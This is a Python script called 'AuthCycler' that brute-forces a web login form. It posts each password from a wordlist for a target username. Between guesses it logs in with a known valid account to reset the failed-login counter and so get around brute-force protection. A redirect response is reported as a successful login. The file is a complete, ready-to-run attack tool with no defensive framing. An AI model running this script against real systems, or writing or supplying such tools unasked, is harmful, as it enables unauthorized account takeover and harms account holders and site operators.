import requests
import os
import readline
import glob
import argparse
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# === Autocomplete Path Function ===


def complete_path(text, state):
    line = readline.get_line_buffer()
    if not line:
        return None
    results = glob.glob(os.path.expanduser(text) + '*')
    if state < len(results):
        return results[state]
    else:
        return None


readline.set_completer_delims(' \t\n;')
readline.parse_and_bind("tab: complete")
readline.set_completer(complete_path)


def brute_force(url, username_valid, password_valid, target_user, wordlist):
    with open(wordlist, "r", encoding="utf-8") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(Fore.CYAN + "\n[~] Starting brute force...\n")

    for password in passwords:
        # 1. Try target login
        data = {"username": target_user, "password": password}
        r = requests.post(url, data=data, allow_redirects=False)

        if r.status_code == 302:
            print(Fore.GREEN + f"[+] SUCCESS -> {target_user}:{password}")
            return

        else:
            print(
                Fore.RED + f"[-] FAILED -> {target_user}:{password} ({r.status_code})")

        # 2. Reset counter using valid credentials
        reset_data = {"username": username_valid, "password": password_valid}
        r_reset = requests.post(url, data=reset_data, allow_redirects=False)

        if r_reset.status_code == 302:
            print(Fore.YELLOW +
                  f"[~] Counter reset with {username_valid}:{password_valid}")
        else:
            print(Fore.MAGENTA + f"[!] Reset failed ({r_reset.status_code})")

    print(Fore.RED + "[x] Password not found in wordlist.")


def main():
    parser = argparse.ArgumentParser(
        description="AuthCycler - Brute Force Automation Script")
    parser.add_argument("--url", help="Target login URL")
    parser.add_argument(
        "--valid-user", help="Valid account username (for reset)")
    parser.add_argument(
        "--valid-pass", help="Valid account password (for reset)")
    parser.add_argument("--target", help="Target username to brute-force")
    parser.add_argument("--wordlist", help="Path to wordlist file")

    args = parser.parse_args()

    # Interactive input if args are missing
    url = args.url or input("Enter target login URL: ").strip()
    username_valid = args.valid_user or input(
        "Enter valid username (for reset): ").strip()
    password_valid = args.valid_pass or input(
        "Enter valid password (for reset): ").strip()
    target_user = args.target or input("Enter target username: ").strip()
    wordlist = args.wordlist or input("Enter path to wordlist: ").strip()
    wordlist = os.path.expanduser(wordlist)

    if not os.path.isfile(wordlist):
        print(Fore.RED + f"[!] Wordlist file not found: {wordlist}")
        return

    brute_force(url, username_valid, password_valid, target_user, wordlist)


if __name__ == "__main__":
    main()
